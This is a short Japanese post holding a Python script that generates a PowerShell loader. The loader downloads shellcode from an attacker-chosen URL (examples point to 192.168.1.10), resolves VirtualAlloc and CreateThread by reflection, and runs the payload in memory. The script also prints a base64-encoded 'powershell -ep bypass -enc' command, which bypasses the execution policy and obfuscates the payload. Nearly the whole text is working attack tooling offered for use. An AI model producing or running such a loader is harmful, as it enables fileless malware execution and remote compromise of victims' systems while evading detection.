シェルコードをダウンロード・実行までインメモリで行うpowershellスクリプトを出力するpythonスクリプト

必要なのもの：シェルコードのURL
```python
#!/usr/bin/env python3
"""
Usage:
  python3 shellcode_to_ps1.py <url> [output.ps1]

Examples:
  python3 shellcode_to_ps1.py http://192.168.1.10/payload.bin
  python3 shellcode_to_ps1.py http://192.168.1.10:8080/payload.bin run.ps1
"""

import sys
import base64

TEMPLATE = """\
function LookupFunc {{
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {{If($_.Name -eq "GetProcAddress") {{$tmp+=$_}}}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}}
function getDelegateType {{
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])
  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')
  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}}
[Byte[]] $buf = (New-Object Net.WebClient).DownloadData('{URL}')
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int32]))).Invoke($hThread, 0xFFFFFFFF)
"""

def to_base64(ps1: str) -> str:
    """PowerShell -EncodedCommand 用のUTF-16LE Base64に変換"""
    encoded = base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")
    return encoded


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url> [output.ps1]")
        sys.exit(1)

    url    = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) >= 3 else None

    ps1    = TEMPLATE.format(URL=url)
    b64    = to_base64(ps1)

    # ─── 標準出力 ────────────────────────────────────────────────
    print("=" * 60)
    print("[*] Plain PS1:")
    print("=" * 60)
    print(ps1)

    print("=" * 60)
    print("[*] Base64 (UTF-16LE / PowerShell -EncodedCommand):")
    print("=" * 60)
    print(b64)
    print()
    print("[*] 実行コマンド例:")
    print(f"    powershell -ep bypass -enc {b64}")

    # ─── ファイル出力 ─────────────────────────────────────────────
    if output:
        # .ps1 ファイル
        with open(output, "w", encoding="utf-8") as f:
            f.write(ps1)
        print(f"\n[*] PS1  → {output}")

        # .b64 ファイル（同名で拡張子変更）
        b64_output = output.rsplit(".", 1)[0] + ".b64"
        with open(b64_output, "w", encoding="ascii") as f:
            f.write(b64 + "\n")
        print(f"[*] B64  → {b64_output}")


if __name__ == "__main__":
    main()
```
